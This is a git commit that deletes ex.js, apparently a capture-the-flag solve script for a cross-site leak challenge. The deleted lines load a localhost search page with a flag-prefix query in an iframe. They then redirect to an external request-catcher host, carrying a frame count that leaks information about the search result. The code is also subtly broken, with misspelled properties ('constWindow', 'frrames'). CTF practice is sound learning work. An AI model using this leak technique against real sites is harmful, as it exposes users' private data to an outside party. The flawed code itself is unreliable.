994d9773e2db491c2984401aeccc114f123d57e8
parkttule <100356715+parkttule@users.noreply.github.com>
2023-02-17 17:00:18 +0900

    Delete ex.js

--- ex.js
+++
@@ -1,6 +0,0 @@
-var iframe = document.createElement("iframe");
-iframe.src = "http://localhost:8000/search?query=DH{";
-iframe.onload = () => {
-	location.href=`https://xphohdw.request.dreamhack.games/${iframe.constWindow.frrames.length}`;
-};
-
